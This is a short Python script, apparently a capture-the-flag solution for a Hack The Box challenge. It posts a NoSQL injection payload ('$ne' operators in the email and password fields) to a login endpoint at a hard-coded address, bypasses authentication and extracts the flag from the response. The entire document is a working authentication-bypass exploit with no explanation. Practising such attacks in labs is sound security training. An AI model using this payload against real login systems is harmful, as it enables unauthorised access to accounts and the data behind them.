import requests
import re

host, port = "94.237.121.185", 38984

url = f"http://{host}:{port}/login"

data = {
    "email": {
        "$ne": 0
    },
    "password": {
        "$ne": 0    
    }
}

response = requests.post(url, json=data)

flag = re.search(r'HTB\{.*?\}',response.text)

print(flag.group())